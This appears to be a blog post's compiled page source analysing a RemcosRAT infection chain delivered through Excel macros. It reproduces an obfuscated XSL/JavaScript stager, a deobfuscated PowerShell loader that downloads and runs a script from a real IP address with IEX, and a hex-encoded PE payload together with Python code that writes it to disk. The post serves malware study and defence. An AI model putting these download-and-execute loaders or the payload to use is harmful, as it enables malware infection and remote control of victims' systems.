36253637253342253634253646253230253742253234253730253639253645253637253230253344253230253734253635253733253734253244253633253646253645253645253635253633253734253639253646253645253230253244253633253646253644253730253230253637253646253646253637253643253635253245253633253646253644253230253244253633253646253735253645253734253230253331253230253244253531253735253639253635253734253744253230253735253645253734253639253643253230253238253234253730253639253645253637253239253342253234253734253734253739253344253237253238253445253635253737253244253237253242253237253446253632253641253635253237253242253237253633253734253230253445253635253237253242253237253734253245253537253635253237253242253237253632253433253643253639253237253242253237253635253645253734253239253237253743253439253630253435253630253538253342253234253644253736253344253230253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253439253645253734253635253732253631253633253734253639253646253645253544253341253341253433253631253643253643253432253739253645253631253644253635253238253234253734253734253739253243253237253434253646253737253645253643253646253631253634253533253734253732253639253645253637253237253243253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253433253631253643253643253534253739253730253635253544253341253341253444253635253734253638253646253634253243253237253638253734253734253730253237253230253242253230253237253341253246253246253331253330253334253245253332253332253333253245253331253331253339253245253331253336253337253246253633253631253643253639253635253645253734253245253641253730253637253237253239253342253234253732253337253338253636253634253330253330253330253733253634253344253230253234253644253736253230253244253733253730253643253639253734253230253237253235253237253230253743253436253646253732253435253631253633253638253244253446253632253641253635253633253734253230253742253542253633253638253631253732253544253542253632253739253734253635253544253232253330253738253234253546253232253744253342253234253739253335253641253638253336253332253634253636253330253344253230253439253630253435253630253538253238253234253732253337253338253636253634253330253330253330253733253634253230253244253641253646253639253645253230253237253237253239273B246A6D3D2444436F626356456D76694A72416B484D595547572E53706C69742827252729207C20666F7245616368207B5B636861725D285B636F6E766572745D3A3A746F696E74313628245F2C313629297D3B496045605828246A6D202D6A6F696E20272729\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"x0asd44\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" str \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"for\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" i \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" i \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\" hex\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" i \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" str \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name known-class-name\",children:\"String\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token function property-access method\",children:\"fromCharCode\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"parseInt\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"hex\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token function property-access method\",children:\"substr\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"16\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"return\"}),\" str\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\"msxsl\",(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\"script\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\"xsl\",(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\"stylesheet\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"First decode the string we are passing to \",(0,e.jsx)(n.strong,{children:\"ActiveXObject\"}),\" function.\"]}),(0,e.jsx)(n.pre,{className:\"language-javascript\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-javascript\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"x0asd44\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" str \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"for\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" i \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" i \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\" hex\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" i \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" str \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name known-class-name\",children:\"String\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token function property-access method\",children:\"fromCharCode\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"parseInt\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"hex\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token function property-access method\",children:\"substr\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"16\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"return\"}),` str\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token class-name console\",children:\"console\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token function property-access method\",children:\"log\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"x0asd44\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'5368656c6c2e4170706c69636174696f6e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"Executing the above javascript code, our hexstring string parameter is decoded to \",(0,e.jsx)(n.code,{children:\"Shell.Application\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"Below is the deobfuscated powershell script which is passed \",(0,e.jsx)(n.code,{children:\"shell.Application\"}),\" as shown in the obsfucated script.\"]}),(0,e.jsx)(n.pre,{className:\"language-powershell\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-powershell\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token string\",children:\"'[void] [System.Reflection.Assembly]::LoadWithPartialName(''Microsoft.VisualBasic'')'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"|\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"IEX\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$t56fg\"}),\" = \",(0,e.jsx)(n.span,{className:\"token namespace\",children:\"[Enum]\"}),\"::ToObject\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token namespace\",children:\"[System.Net.SecurityProtocolType]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" 3072\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token namespace\",children:\"[System.Net.ServicePointManager]\"}),\"::SecurityProtocol = \",(0,e.jsx)(n.span,{className:\"token variable\",children:\"$t56fg\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"do\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$ping\"}),\" = \",(0,e.jsx)(n.span,{className:\"token function\",children:\"test-connection\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\"comp google\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"com \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\"count 1 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\"Quiet\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"until\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$ping\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$tty\"}),\"=\",(0,e.jsx)(n.span,{className:\"token string\",children:\"'(New-Object Net.WebClient)'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"|\"}),\"I`E`X\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$mv\"}),\"= \",(0,e.jsx)(n.span,{className:\"token namespace\",children:\"[Microsoft.VisualBasic.Interaction]\"}),\"::CallByname\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$tty\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'DownloadString'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token namespace\",children:\"[Microsoft.VisualBasic.CallType]\"}),\"::Method\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'http://104.223.119.167/calient.jpg'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$r78fd000sd\"}),\"= \",(0,e.jsx)(n.span,{className:\"token variable\",children:\"$mv\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\"split \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'%'\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"|\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"ForEach-Object\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token namespace\",children:\"[char]\"}),(0,e.jsx)(n.span,{className:\"token namespace\",children:\"[byte]\"}),(0,e.jsxs)(n.span,{className:\"token string\",children:['\"0x',(0,e.jsx)(n.span,{className:\"token variable\",children:\"$_\"}),'\"']}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$y5jh62df0\"}),\"= I`E`X\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$r78fd000sd\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-join\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"The deobfuscated powershell script above downloads another string at the domain highlighted above. The malware gets obsfuscated strings of the \",(0,e.jsx)(n.code,{children:\"calient.jpg\"}),\" url.\"]}),(0,e.jsxs)(n.h2,{id:\"stage3-downloader-calientjpg\",children:[(0,e.jsx)(n.a,{href:\"#stage3-downloader-calientjpg\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage3 Downloader (calient.jpg)\"]}),(0,e.jsxs)(n.p,{children:[\"Stage two downloads third obfuscated script strings in calient.jpg url. This string is obfuscated and larger than the second stage \",(0,e.jsx)(n.code,{children:\"atcn.jpg\"}),\" string. Looking at the obfuscated strings we have an interesting string referenced by \",(0,e.jsx)(n.code,{children:\"ftIXfysfU\"}),\" variable.\"]}),(0,e.jsx)(n.pre,{className:\"language-xml\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-xml\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`$y='[System.AppDomain]'|W0B4J;\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`$g55=$y.GetMethod(\"get_CurrentDomain\")\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:` [String]$ftIXfysfU='4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300AF89D1610000000000000000E00002210B010800004402000048\n`})]})}),(0,e.jsx)(n.p,{children:\"The string above seems to be an executable. This is because of the header file of PE executable. The magic number 4D5A or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.\"}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"Http filter\",src:\"/static/images/mal/remcosrat/pehead.png\",width:\"630\",height:\"259\"})}),(0,e.jsx)(n.p,{children:\"Simple python script for decoding the bytes into an executable\"}),(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-python\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#convert bytearray to PE\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"remcosPE\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"bytearray\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"bytes\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"fromhex\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'4D5A90000300000004000000FFFc....'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"with\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'open.exe'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'wb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"as\"}),\" filepe\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    filepe\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"write\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"remcosPE\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsx)(n.p,{children:\"Now we have a fully RemcosRat malware, which a .NET family malware.\"}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"remcosrat$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"file\"}),` open.exe\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"open.exe: PE32 executable \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"DLL\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"console\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" Intel \",(0,e.jsx)(n.span,{className:\"token number\",children:\"80386\"}),\" Mono/.Net assembly, \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),` MS Windows\n`]})]})}),(0,e.jsx)(n.p,{children:\"Next is analyzing the dropped PE file.\"}),(0,e.jsxs)(n.h2,{id:\"references\",children:[(0,e.jsx)(n.a,{href:\"#references\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"References\"]}),(0,e.jsxs)(n.ol,{children:[(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://www.malware-traffic-analysis.net/2022/01/04/index.html\",children:\"https://www.malware-traffic-analysis.net/2022/01/04/index.html\"})}),(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://twitter.com/Unit42_Intel/status/1478744612516900868/\",children:\"https://twitter.com/Unit42_Intel/status/1478744612516900868/\"})})]})]})}}var y=b;function x(a,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return f(v);})();\n;return Component;","toc":[{"value":"What is RemcosRat?","url":"#what-is-remcosrat","depth":1},{"value":"Pcap Analysis","url":"#pcap-analysis","depth":2},{"value":"Stage2 Downloader (atcn.jpg)","url":"#stage2-downloader-atcnjpg","depth":2},{"value":"Stage3 Downloader (calient.jpg)","url":"#stage3-downloader-calientjpg","depth":2},{"value":"References","url":"#references","depth":2}],"frontMatter":{"readingTime":{"text":"6 min read","minutes":5.535,"time":332100,"words":1107},"slug":"remcosrat","fileName":"remcosrat.mdx","title":"RemcosRat infection chain from excel with Macros","date":"2022-01-25","tags":["Remcos","rat","malware"],"draft":false,"summary":"RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files.","images":"/static/images/mal/remcosrat/headmail.jpg","layout":"PostLayout","canonicalUrl":null}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.53,"time":31800,"words":106},"slug":["default"],"fileName":"default.md","name":"Thuri","avatar":"/static/images/profile.png","occupation":"Software Developer","email":"thuri783@gmail.com","github":"https://github.com/thuri10"}],"prev":{"title":"Return-Oriented Programming - Callme","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.","layout":"PostLayout","images":"/static/images/ropemporium/callme.jpg","slug":"ropemporium-callme"},"next":{"title":"RedLineStealer Information Stealer Analysis","date":"2022-02-07T00:00:00.000Z","tags":["malware","RedlineStealer"],"draft":false,"summary":"Redline malware is an Information Stealer written in c# , targeting windows victims. It is used for gathering victims information ranging from cookies, credentials, Discord tokens","images":"/static/images/redline/coverpage.png","layout":"PostLayout","canonicalUrl":null,"slug":"redlinerstealer"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["remcosrat"]},"buildId":"TTM5K-2h9ABH7fjyD5O84","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>